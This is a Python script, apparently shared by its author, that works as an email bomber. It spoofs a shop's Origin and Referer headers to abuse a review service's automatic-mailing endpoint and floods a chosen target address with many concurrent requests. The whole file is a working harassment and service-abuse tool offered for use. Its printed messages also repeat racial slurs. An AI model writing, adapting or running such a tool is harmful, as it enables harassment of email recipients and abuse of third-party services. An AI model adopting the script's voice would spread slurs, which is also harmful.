import requests
import random
import concurrent.futures
import time
import sys
from colorama import Fore, Style, init

#plz no sue no report no plz

init()

url = 'https://credible-opinion.opineo.pl/company/0591f19736/automatic-mailing'

def create_payload(email, order_number, product_id):
    return {
        "email": email,
        "orderNumber": order_number,
        "sendAfterDays": 0,
        "products": [
            {
                "shopInternalProductId": product_id,
                "brand": "test",
                "model": "test 2"
            }
        ]
    }


headers = {
    'Content-Type': 'application/json;charset=UTF-8',
    'Accept': 'application/json, text/plain, */*',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    'Origin': 'https://wkdzike.pl', #dont change it cuz it wont work
    'Referer': 'https://wkdzik.pl/',#dont change it cuz it wont work
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Accept-Language': 'pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7',
    'Sec-CH-UA': '"Brave";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
    'Sec-CH-UA-Mobile': '?0',
    'Sec-CH-UA-Platform': '"Windows"',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-GPC': '1'
}

def generate_random_order_number():
    return str(random.randint(100000, 999999))

def generate_random_product_id():
    return str(random.randint(1000, 99999))

def send_single_request(email):
    order_number = generate_random_order_number()
    product_id = generate_random_product_id()
    payload = create_payload(email, order_number, product_id)

    response = requests.post(url, json=payload, headers=headers)

    if response.status_code == 201:
        return f"{Fore.GREEN}sent the mail: OrderID: {order_number}, Product {product_id}{Style.RESET_ALL}"
    else:
        return f"{Fore.RED}failed to send the mail (ratelimited): Status {response.status_code}, OrderID: {order_number}{Style.RESET_ALL}"

def send_multiple_requests():
    print(f"{Fore.CYAN}yo wsg nigga, welcome to nigga mail spammer($$bomber$$) by kacorvixon :3{Style.RESET_ALL}")

    email = input(f"{Fore.YELLOW}enter target mail: {Style.RESET_ALL}")
    if "@" not in email or "." not in email:
        print(f"{Fore.RED}dawgg, that aint no valid mail make sure u typing it righttt{Style.RESET_ALL}")
        sys.exit(1)

    try:
        num_requests = int(input(f"{Fore.YELLOW}how many mails to send: {Style.RESET_ALL}"))
        delay = int(input(f"{Fore.YELLOW}sending delay (in ms): {Style.RESET_ALL}"))
        if delay < 0:
            print(f"{Fore.RED}nigga tha delay cant be lower than 0{Style.RESET_ALL}")
            sys.exit(1)
    except ValueError:
        print(f"{Fore.RED}nigga that isnt a number{Style.RESET_ALL}")
        sys.exit(1)

    print(f"{Fore.CYAN}starting the spammer (can take some time to start sending){Style.RESET_ALL}")

    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = []
        for _ in range(num_requests):
            futures.append(executor.submit(send_single_request, email))
            time.sleep(delay / 1000)
        
        for future in concurrent.futures.as_completed(futures):
            print(future.result())

if __name__ == "__main__":
    send_multiple_requests()
